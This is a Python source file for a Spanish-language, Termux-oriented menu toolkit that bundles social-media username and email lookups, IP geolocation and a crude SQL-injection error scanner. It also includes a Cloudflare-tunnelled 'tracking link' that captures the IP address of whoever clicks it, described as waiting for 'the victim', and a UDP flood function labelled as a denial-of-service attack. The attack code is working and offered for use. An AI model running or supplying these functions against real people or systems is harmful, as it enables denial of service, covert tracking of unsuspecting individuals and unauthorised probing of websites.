import sys
import subprocess
import os
import re
import socket
import threading
import time
import signal
import requests
import random
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
try:
    import dns.resolver
except ImportError:
    pass

# --- Definición de códigos de color ANSI ---
VERDE = "\033[92m"
BLANCO = "\033[97m"
ROJO = "\033[91m"
AZUL = "\033[94m"
RESET = "\033[0m"

# --- Funciones de Utilidad ---
def clear_screen():
    """Limpia la pantalla de la terminal."""
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def print_banner():
    """Imprime el banner principal."""
    clear_screen()
    print(f"""{VERDE}


▛▀▘▛▀▘▛▀▖▙ ▌▞▀▖▙ ▌▛▀▖▞▀▖▌     ▌  
▙▄ ▙▄ ▙▄▘▌▌▌▙▄▌▌▌▌▌ ▌▌ ▌▛▀▖▌ ▌▛▀▖
▌  ▌  ▌▚ ▌▝▌▌ ▌▌▝▌▌ ▌▌ ▌▌ ▌▌ ▌▌ ▌
▘  ▀▀▘▘ ▘▘ ▘▘ ▘▘ ▘▀▀ ▝▀ ▘ ▘▝▀▘▀▀ 

                                                                     

{RESET}""")

def is_tool_installed(tool_name):
    """Comprueba si una herramienta está instalada en el sistema."""
    try:
        subprocess.run([tool_name, '--version'], check=True, capture_output=True, text=True)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError):
        return False

def install_dependency(package_name, tool_name=None):
    """Intenta instalar un paquete usando múltiples gestores."""
    if tool_name is None:
        tool_name = package_name
    
    if is_tool_installed(tool_name):
        print(f"{VERDE}[+] La herramienta {tool_name} ya está instalada.{RESET}")
        return True

    package_managers = [
        {'command': 'pkg', 'install_flags': ['install', '-y']},
        {'command': 'apt', 'install_flags': ['install', '-y']},
        {'command': 'apt-get', 'install_flags': ['install', '-y']}
    ]

    print(f"\n{AZUL}[*] {tool_name} no encontrado. Intentando instalar automáticamente...{RESET}")
    for pm in package_managers:
        try:
            print(f"[*] Probando con el gestor de paquetes '{pm['command']}'...")
            subprocess.run([pm['command']] + pm['install_flags'] + [package_name], check=True)
            print(f"{VERDE}[+] Instalación de {tool_name} completada con {pm['command']}.{RESET}")
            return True
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
            
    print(f"{ROJO}[!] No se pudo instalar {tool_name}. Ningún gestor de paquetes compatible encontrado.{RESET}")
    return False

def create_sites_file():
    """Crea el archivo de sitios si no existe."""
    if not os.path.exists("sitios_usuarios.txt"):
        print(f"\n{AZUL}[*] Archivo 'sitios_usuarios.txt' no encontrado. Creando uno por defecto...{RESET}")
        with open("sitios_usuarios.txt", "w") as f:
            f.write("Facebook,https://www.facebook.com/{}\n")
            f.write("Instagram,https://www.instagram.com/{}\n")
            f.write("Twitter,https://twitter.com/{}\n")
            f.write("GitHub,https://github.com/{}\n")
            f.write("LinkedIn,https://www.linkedin.com/in/{}\n")
        print(f"{VERDE}[+] Archivo creado con éxito.{RESET}")

# --- Funciones de Ataque y Reconocimiento ---
def buscar_usuario():
    username = input(f"{AZUL}[*] Ingresa el nombre de usuario a buscar: {RESET}")
    print(f"[*] Buscando el nombre de usuario {AZUL}{username}{RESET}...")
    sitios_encontrados = []
    
    try:
        with open("sitios_usuarios.txt", "r") as f:
            lineas = f.readlines()
    except FileNotFoundError:
        print(f"[!] El archivo '{BLANCO}sitios_usuarios.txt{RESET}' no se encontró.")
        return []

    for linea in lineas:
        linea = linea.strip()
        if not linea or ',' not in linea:
            continue
        try:
            nombre_sitio, url_base = linea.split(",", 1)
            url_perfil = url_base.format(username)
            print(f"[*] Probando {nombre_sitio}...")
            response = requests.get(url_perfil, timeout=5)
            
            if response.status_code == 200:
                print(f"{VERDE}[+] Usuario '{username}' ENCONTRADO en {nombre_sitio}{RESET}")
                sitios_encontrados.append(url_perfil)
            else:
                print(f"{ROJO}[-] Usuario '{username}' NO ENCONTRADO en {nombre_sitio}.{RESET}")
        except Exception:
             print(f"[!] {BLANCO}Error al conectar{RESET} con {nombre_sitio} para '{username}'.")
    return sitios_encontrados

def buscar_correo():
    email = input(f"{AZUL}[*] Ingresa el correo electrónico a buscar: {RESET}")
    print(f"[*] Usando la herramienta {VERDE}Holehe{RESET} para buscar el correo: {email}")
    print("---")

    if "@" in email and "." in email:
        if not is_tool_installed('holehe'):
            install_dependency('holehe')
        
        try:
            proceso = subprocess.run(['holehe', email], capture_output=True, text=True, check=True)
            salida_holehe = proceso.stdout
        except (FileNotFoundError, subprocess.CalledProcessError):
            print(f"{ROJO}[!] No se pudo ejecutar Holehe.{RESET}")
            return
    else:
        print(f"{ROJO}[!] ERROR:{RESET} El formato del correo electrónico es incorrecto.")
        return 

    lineas = salida_holehe.split('\n')
    urls_registradas = []
    for linea in lineas:
        if "Registered" in linea or "Exists" in linea:
            match = re.search(r'https?://[a-zA-Z0-9.-]+', linea)
            if match:
                urls_registradas.append(match.group(0))

    print(f"\n{VERDE}Correo registrado en:{RESET}")
    if urls_registradas:
        for url in urls_registradas:
            print(f"{VERDE}  - {url}{RESET}")
    else:
        print(f"{BLANCO}  - No se encontró registro en sitios populares.{RESET}")
    print(f"\n{BLANCO}--- Salida completa de Holehe ---{RESET}")
    print(salida_holehe)

def track_ip(ip_address=None):
    if ip_address is None:
        ip_address = input(f"{AZUL}[*] Ingresa la dirección IP a rastrear: {RESET}")
    print(f"[*] Rastreo de IP en progreso para: {AZUL}{ip_address}{RESET}")
    print("---")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        data = response.json()
        if data['status'] == 'success':
            print(f"{VERDE}[+] Información de IP encontrada:{RESET}")
            print(f"  - País: {data.get('country')}")
            print(f"  - Ciudad: {data.get('city')}")
            print(f"  - Región: {data.get('regionName')}")
            print(f"  - ISP: {data.get('isp')}")
            print(f"  - Organización: {data.get('org')}")
            print(f"  - Latitud/Longitud: {data.get('lat')}, {data.get('lon')}")
        else:
            print(f"{ROJO}[-] No se pudo obtener información para la IP: {ip_address}{RESET}")
            print(f"{BLANCO}Mensaje de error: {data.get('message')}{RESET}")
    except requests.exceptions.RequestException:
        print(f"{ROJO}[!] Error al conectar con el servicio de rastreo de IP.{RESET}")

def scan_vulnerability():
    url = input(f"{AZUL}[*] Ingresa la URL a escanear (ej. http://ejemplo.com/page.php?id=1): {RESET}")
    print(f"\n[*] Analizando vulnerabilidad de inyección SQL en: {AZUL}{url}{RESET}")
    payloads = ["'", "''", '"', '""']
    sql_errors = ["SQL syntax", "mysql_fetch_array()", "Warning: mysql_query()"]
    try:
        for payload in payloads:
            test_url = f"{url}'" if '?' not in url else f"{url}{payload}"
            print(f"[*] Probando con el payload: {payload}")
            response = requests.get(test_url, timeout=10)
            for error in sql_errors:
                if error in response.text:
                    print(f"\n{ROJO}[!] POSIBLE VULNERABILIDAD DETECTADA:{RESET}")
                    print(f"    - URL vulnerable: {test_url}")
                    print(f"    - Error de base de datos encontrado: {error}")
                    print(f"{VERDE}[+] Recomiendo un análisis más profundo con herramientas especializadas.{RESET}")
                    return
        print(f"\n{VERDE}[+] No se detectaron vulnerabilidades de inyección SQL obvias.{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{ROJO}[!] Error de conexión: {e}{RESET}")

cloudflared_pid = None
class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        public_ip = self.headers.get('X-Forwarded-For')
        if public_ip:
            print(f"\n{VERDE}[+] Conexión recibida{RESET}")
            print(f"    - IP del cliente (privada): {AZUL}{client_ip}{RESET}")
            print(f"    - IP del cliente (pública): {AZUL}{public_ip}{RESET}")
        else:
            print(f"\n{VERDE}[+] Conexión recibida{RESET}")
            print(f"    - IP del cliente: {AZUL}{client_ip}{RESET}")
            print(f"    - {ROJO}No se pudo obtener la IP pública.{RESET}")
        try:
            if cloudflared_pid:
                os.kill(cloudflared_pid, signal.SIGINT)
        except NameError:
            pass
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Conectado</h1></body></html>")
        self.server.shutdown()

def run_server(port):
    try:
        server = HTTPServer(('0.0.0.0', port), MyHandler)
        server.serve_forever()
    except Exception as e:
        print(f"{ROJO}[!] ERROR al iniciar el servidor: {e}{RESET}")

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def get_ip_from_link():
    port_str = input(f"{AZUL}[*] Ingresa el puerto para el servidor local (ej. 8080): {RESET}")
    try:
        port = int(port_str)
    except ValueError:
        print(f"{ROJO}[!] El puerto debe ser un número válido.{RESET}")
        return

    global cloudflared_pid
    current_port = port
    while is_port_in_use(current_port):
        print(f"{ROJO}[!] El puerto {current_port} ya está en uso.{RESET}")
        if current_port >= 9995:
            print(f"{ROJO}[!] No se pudo encontrar un puerto disponible en el rango. Saliendo...{RESET}")
            return
        current_port += 5
        print(f"[*] Intentando con el siguiente puerto disponible: {AZUL}{current_port}{RESET}")
    final_port = current_port
    server_thread = threading.Thread(target=run_server, args=(final_port,))
    server_thread.daemon = True
    server_thread.start()
    print(f"\n[*] Servidor local iniciando en el puerto {final_port}...")
    time.sleep(1)
    print("[*] Servidor local iniciado.")
    
    if not is_tool_installed('cloudflared'):
        if not install_dependency('cloudflared', 'Cloudflared'):
            return
    
    print(f"\n[*] Levantando un túnel público con Cloudflare...")
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{final_port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        cloudflared_pid = process.pid
        public_url = None
        for line in process.stdout:
            print(line, end='')
            match = re.search(r'https?://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
            if match:
                public_url = match.group(0)
                print(f"\n{VERDE}[+] ¡Túnel generado con éxito!{RESET}")
                print(f"[*] Enlace de rastreo: {AZUL}{public_url}{RESET}")
                print("\n[*] Esperando la conexión de la víctima...")
                break
        if public_url:
            process.wait()
        else:
            error_output = process.stderr.read()
            print(f"{ROJO}[!] No se pudo obtener el enlace del túnel. Salida de error:\n{error_output}{RESET}")
            process.kill()
    except FileNotFoundError:
        print(f"{ROJO}[!] El comando 'cloudflared' no se encontró.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] Interrupción por el usuario. Deteniendo el túnel y el servidor.{RESET}")
    finally:
        if 'process' in locals() and process.poll() is None:
            process.terminate()
            process.wait()
        sys.exit(0)

def network_flood():
    target = input(f"{AZUL}[*] Ingresa la IP, el puerto y la duración (ej. 192.168.1.1:80:60): {RESET}")
    try:
        ip_port_duration = target.split(':')
        if len(ip_port_duration) != 3:
            print(f"{ROJO}[!] Formato incorrecto. Usa: IP:PUERTO:DURACION{RESET}")
            return
        ip, port_str, duration_str = ip_port_duration
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        print(f"{ROJO}[!] Formato incorrecto para el puerto o la duración. Deben ser números enteros.{RESET}")
        return

    print(f"\n[*] Iniciando inundación UDP a {ip}:{port} durante {duration} segundos...")
    packet_count = 0
    start_time = time.time()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
        
        while time.time() < start_time + duration:
            s.sendto(packet, (ip, port))
            packet_count += 1
            
        s.close()
        
    except socket.gaierror:
        print(f"\n{ROJO}[!] ERROR: Dirección o nombre de host inválido.{RESET}")
    except Exception as e:
        print(f"\n{ROJO}[!] ERROR: Ocurrió un error inesperado: {e}{RESET}")
    finally:
        print(f"\n[+] Inundación finalizada. Paquetes enviados: {packet_count}")


def get_website_info():
    url = input(f"{AZUL}[*] Ingresa la URL o dominio del sitio web (ej. google.com): {RESET}")
    print(f"[*] Obteniendo información de {AZUL}{url}{RESET}...")
    
    if not url.startswith("http"):
        url = "http://" + url
    
    domain = url.split("//")[-1].split("/")[0]

    try:
        # Obtener IP
        ip_address = socket.gethostbyname(domain)
        print(f"{VERDE}[+] Dirección IP:{RESET} {ip_address}")

        # Obtener información de headers HTTP y ordenar
        print(f"\n[*] Headers del servidor...")
        try:
            response = requests.get(url, timeout=5)
            headers = response.headers
            
            # Encabezados clave que queremos mostrar
            key_headers = [
                'Server',
                'Content-Type',
                'Content-Length',
                'Date',
                'Cache-Control',
                'X-Frame-Options',
                'Content-Encoding'
            ]
            
            # Itera sobre el diccionario para una salida más limpia
            for key in key_headers:
                value = headers.get(key, 'No disponible')
                print(f"  - {key}: {value}")

        except requests.exceptions.RequestException as e:
            print(f"{ROJO}[-] No se pudo obtener headers: {e}{RESET}")

        # Obtener geolocalización de la IP
        print(f"\n[*] Geolocalización de la IP...")
        track_ip(ip_address)
        
        # Obtener servidores DNS (NS records)
        print(f"\n[*] Servidores DNS (NS)...")
        if not is_tool_installed('dig'):
            install_dependency('dnsutils', 'dig')
            
        try:
            result = subprocess.run(['dig', '+short', domain, 'NS'], capture_output=True, text=True, check=True)
            if result.stdout:
                for line in result.stdout.strip().split('\n'):
                    print(f"  - {line}")
            else:
                print(f"{ROJO}[-] No se encontraron registros NS para el dominio.{RESET}")
        except Exception as e:
            print(f"{ROJO}[-] No se pudo resolver los registros DNS: {e}{RESET}")

    except socket.gaierror:
        print(f"{ROJO}[!] ERROR: No se pudo resolver la dirección del sitio web.{RESET}")
    except Exception as e:
        print(f"{ROJO}[!] Ocurrió un error inesperado: {e}{RESET}")
        
def install_tool():
    """Instala el script de ejecución 'Fh' para usar la herramienta como un comando."""
    install_path = "/data/data/com.termux/files/usr/bin/Fh"
    script_path = os.path.abspath(__file__)
    
    fh_content = f"""#!/bin/bash
python3 {script_path}
"""
    try:
        with open(install_path, "w") as f:
            f.write(fh_content)
        os.chmod(install_path, 0o755)  # Dar permisos de ejecución
        print(f"\n{VERDE}[+] ¡Instalación completada!{RESET}")
        print(f"[*] Ahora puedes usar tu herramienta desde cualquier lugar escribiendo: {AZUL}Fh{RESET}")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
    except PermissionError:
        print(f"\n{ROJO}[!] ERROR: Permiso denegado.{RESET}")
        print("[-] No tienes los permisos necesarios para escribir en el directorio de sistema.")
        print("[-] Por favor, ejecuta el script de instalación con privilegios de root (si es necesario).")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
    except Exception as e:
        print(f"\n{ROJO}[!] Ocurrió un error durante la instalación: {e}{RESET}")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")


def show_menu():
    """Muestra el menú principal y maneja la entrada del usuario."""
    while True:
        print_banner()
        print(f"{VERDE}Menú de Opciones:{RESET}")
        print(f"1. {AZUL}Buscar usuario en redes sociales{RESET}")
        print(f"2. {AZUL}Buscar correo en sitios populares{RESET}")
        print(f"3. {AZUL}Rastrear dirección IP{RESET}")
        print(f"4. {AZUL}Escanear vulnerabilidad SQL{RESET}")
        print(f"5. {AZUL}Generar enlace de rastreo de IP{RESET}")
        print(f"6. {AZUL}Realizar ataque de inundación (DoS){RESET}")
        print(f"7. {AZUL}Obtener información de un sitio web{RESET}")
        print(f"8. {AZUL}Instalar la herramienta (comando Fh){RESET}")
        print(f"9. {ROJO}Salir{RESET}")

        choice = input(f"\n{AZUL}Selecciona una opción (1-9): {RESET}")

        if choice == '1':
            buscar_usuario()
        elif choice == '2':
            buscar_correo()
        elif choice == '3':
            track_ip()
        elif choice == '4':
            scan_vulnerability()
        elif choice == '5':
            get_ip_from_link()
        elif choice == '6':
            network_flood()
        elif choice == '7':
            get_website_info()
        elif choice == '8':
            install_tool()
        elif choice == '9':
            print(f"\n{VERDE}[+] ¡Gracias por usar la herramienta!{RESET}")
            sys.exit()
        else:
            print(f"{ROJO}[!] Opción inválida. Intenta de nuevo.{RESET}")
        
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")

# --- Punto de Entrada Principal ---
if __name__ == "__main__":
    try:
        create_sites_file()
        show_menu()
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] Interrupción por el usuario. Saliendo...{RESET}")
        sys.exit(1)
print(" ")
